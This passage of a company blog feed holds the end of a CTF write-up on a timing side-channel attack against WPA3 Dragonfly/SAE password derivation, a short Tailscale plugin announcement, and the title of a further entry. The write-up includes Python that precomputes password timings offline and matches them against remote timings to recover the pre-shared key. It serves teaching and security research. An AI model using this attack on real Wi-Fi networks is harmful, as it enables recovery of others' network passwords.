plain">dN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    defense </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">defense_masks </span><span class="token operator">+</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">is_quadratic_residue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In practice this is good enough for several teams to attack the service simultaneously.</p>
<p>To effectively precompute passwords, an attacker can create an offline dictionary that only hashes and
skips the large number math.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">initiate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> other_mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> k</span><span class="token operator">=</span><span class="token number">40</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">other_mac </span><span class="token operator">=</span><span class="token plain"> other_mac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    counter </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    counter2 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    n </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">bit_length</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Find x</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> counter </span><span class="token operator">&lt;=</span><span class="token plain"> k</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        base </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">compute_hashed_password</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        temp </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">key_derivation_function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">n</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'Dragonfly Hunting And Pecking'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> temp </span><span class="token operator">&gt;=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            counter </span><span class="token operator">=</span><span class="token plain"> counter </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        counter2 </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        counter </span><span class="token operator">=</span><span class="token plain"> counter </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> counter2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The provided challenge also had a terrible way to convert a binary number which really slowed things down,
and also had an off by one error probably.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Convert returned_bits to the non-negative integer c (see Appendix C.2.1).</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">n</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">binary_repr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        C </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">pow</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> n</span><span class="token operator">-</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>versus</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">X </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">int</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">binary_repr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token operator">&lt;&lt;</span><span class="token number">1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>My solution normalized the remote timings to compare them with the offline compute.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">normalize_array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">arr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""Normalize an array to be between 0 and 1."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">arr </span><span class="token operator">-</span><span class="token plain"> arr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">min</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">arr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">max</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token plain"> arr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">min</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">calc_mse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">psk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> guess_timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    y_actual </span><span class="token operator">=</span><span class="token plain"> normalize_array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    y_predicted </span><span class="token operator">=</span><span class="token plain"> normalize_array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">guess_timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    mse </span><span class="token operator">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mean</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">y_actual </span><span class="token operator">-</span><span class="token plain"> y_predicted</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> mse</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">solve_psk_fast</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">ap_mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> my_macs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    computed </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"compute.txt"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">"rb"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">readlines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    psk </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    best_mse </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> line </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> computed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> tmp </span><span class="token operator">=</span><span class="token plain"> line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">split</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">b"|"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        p </span><span class="token operator">=</span><span class="token plain"> p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        guess_timings </span><span class="token operator">=</span><span class="token plain"> json</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">tmp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        mse </span><span class="token operator">=</span><span class="token plain"> calc_mse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> guess_timings</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> mse </span><span class="token operator">&lt;</span><span class="token plain"> best_mse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"new best"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">mse</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            best_mse </span><span class="token operator">=</span><span class="token plain"> mse</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            psk </span><span class="token operator">=</span><span class="token plain"> p</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">psk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> psk</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>During the CTF the services were overwhelmed by naive solutions, so we ended up scaling it up,
but it was a little bit frustrating for some teams at times.  In the future we'll have to put remote timing attempts behind a queue and/or proof of work.</p>
<p>To make the challenge harder, teams were also given a second variant with a larger keyspace. Instead of 60k wordlist, they were asked to attack a random 36-alphabet 5 character password. 7 teams solved it. Hats off to the great work, since you understood something Dan Harkins pretended not to when it was explained to him by so many cryptographers.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="links">Links<a href="https://www.supernetworks.org/pages/blog/midnightsun-qualifiers-2024-dragonfly#links" class="hash-link" aria-label="Direct link to Links" title="Direct link to Links">​</a></h2>
<p>If you'd like to learn more about these attacks, the <a href="https://papers.mathyvanhoef.com/dragonblood.pdf" target="_blank" rel="noopener noreferrer">Dragonblood</a> paper is the one you'll want.</p>
<p>The up to date constant time implementation of the password element deriviation in hostapd is located here: <a href="https://w1.fi/cgit/hostap/tree/src/common/sae.c#n283" target="_blank" rel="noopener noreferrer">https://w1.fi/cgit/hostap/tree/src/common/sae.c#n283</a>.</p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="dragonfly" term="dragonfly"/>
        <category label="sae" term="sae"/>
        <category label="cryptography" term="cryptography"/>
        <category label="ctf" term="ctf"/>
        <category label="wifi" term="wifi"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[SPR Tailscale]]></title>
        <id>https://www.supernetworks.org/pages/blog/spr-tailscale-integration</id>
        <link href="https://www.supernetworks.org/pages/blog/spr-tailscale-integration"/>
        <updated>2024-03-26T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Introducing SPR-TailScale]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introducing-spr-tailscale">Introducing SPR-TailScale<a href="https://www.supernetworks.org/pages/blog/spr-tailscale-integration#introducing-spr-tailscale" class="hash-link" aria-label="Direct link to Introducing SPR-TailScale" title="Direct link to Introducing SPR-TailScale">​</a></h2>
<p>We've released a new iteration of the <a href="https://github.com/spr-networks/spr-tailscale" target="_blank" rel="noopener noreferrer">TailScale integration for SPR</a>!
This plugin was put together with <a href="https://twitter.com/willy_wong" target="_blank" rel="noopener noreferrer">@willy_wong</a>.</p>
<p><img decoding="async" loading="lazy" alt="spr-tailscale" src="https://www.supernetworks.org/pages/assets/images/combo-6570affc7ea16f7b29e7fafdfb216593.png" width="2210" height="1218" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="under-the-hood">Under The Hood<a href="https://www.supernetworks.org/pages/blog/spr-tailscale-integration#under-the-hood" class="hash-link" aria-label="Direct link to Under The Hood" title="Direct link to Under The Hood">​</a></h2>
<p>Getting this plugin to work in the first place required some thinking.
The first was addressing a key missing feature for SPR: interface-based firewall rules and routing.</p>
<p><img decoding="async" loading="lazy" alt="firewall-custom-interface-rule-add" src="https://www.supernetworks.org/pages/assets/images/firewall-custom-interface-rule-add-6c2885f7af0f5fd0911a4fde33cb4c27.png" width="1280" height="599" class="img_ev3q"></p>
<p>This capability lets SPR perform container microsegmentation.  Any interface can be treated this way actually.
It allows for connecting interfaces with policies and groups that SPR has not been explicitly programmed for, as well as providing them API access.</p>
<p>The TailScale plugin sets up its own policy based routing and firewall rules, so being able to run it inside of its own network namespace is ideal.
SPR then uses the custom interface rule to route to the container's network and let it do the forwarding on its own.</p>
<p>Next, setting it up was awkward, painful. To fix this the SPR team added UX for plugins, and the ability to install a plugin via a URL with an OTP code verification. And today we've released this capability for <code>spr-tailscale</code>!  It's supported from SPR version 0.3.7</p>
<p><img decoding="async" loading="lazy" alt="spr-tailscale" src="https://www.supernetworks.org/pages/assets/images/tailscale-ui-29391be90e22dc10a329d1a499d63c55.png" width="2384" height="1158" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-can-it-do-">What can it do ?<a href="https://www.supernetworks.org/pages/blog/spr-tailscale-integration#what-can-it-do-" class="hash-link" aria-label="Direct link to What can it do ?" title="Direct link to What can it do ?">​</a></h2>
<p>This integration lets SPR devices selectively access TailScale peers. And similarly, TailScale peers can be joined to SPR groups to give them access to SPR devices.</p>
<p>The Plugin presents a React Based UI and simplifies the install. After the install, a user needs to present their Auth Key and they're good to go.</p>
<p>The container can run as an exit node as well.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="links">Links<a href="https://www.supernetworks.org/pages/blog/spr-tailscale-integration#links" class="hash-link" aria-label="Direct link to Links" title="Direct link to Links">​</a></h2>
<p>You can check out the <a href="https://github.com/spr-networks/spr-tailscale" target="_blank" rel="noopener noreferrer">spr-tailscale</a> integration here!</p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="tailscale" term="tailscale"/>
        <category label="wireguard" term="wireguard"/>
        <category label="microsegmentation" term="microsegmentation"/>
        <category label="vpn" term="vpn"/>
        <category label="plugins" term="plugins"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Beacon Double Free in IWD]]></title>
        <id>https://www.supernetworks.org/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084</id>
